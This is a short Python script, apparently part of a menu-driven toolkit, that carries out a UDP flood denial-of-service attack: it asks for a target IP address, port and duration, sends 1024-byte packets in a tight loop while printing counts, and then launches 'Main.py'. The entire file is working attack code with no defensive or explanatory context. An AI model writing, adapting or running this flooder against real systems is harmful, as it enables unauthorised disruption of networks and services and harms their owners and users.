try:
    import requests
    import socket
    from concurrent.futures import ThreadPoolExecutor, as_completed
    import time
    import os
except Exception as e:
    input(e)

try:
    def ddos(target_ip, target_port, duration):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = b"\x00" * 1024
        timeout = time.time() + duration
        sent_packets = 0

        print(f"[*] Starting UDP flood on {target_ip}:{target_port} for {duration} seconds...")
        while time.time() < timeout:
            sock.sendto(bytes, (target_ip, target_port))
            sent_packets += 1
            if sent_packets % 1000 == 0:
                print(f"[+] Sent {sent_packets} packets to {target_ip}:{target_port}")

        print(f"[*] Finished sending packets. Total packets sent: {sent_packets}")


    target = input("Enter target IP address: ")
    port = int(input("Enter target port: "))
    duration = int(input("Enter duration of attack in seconds: "))
    ddos(target, port, duration)    

except Exception as e:
    input(e)

os.system("python Main.py")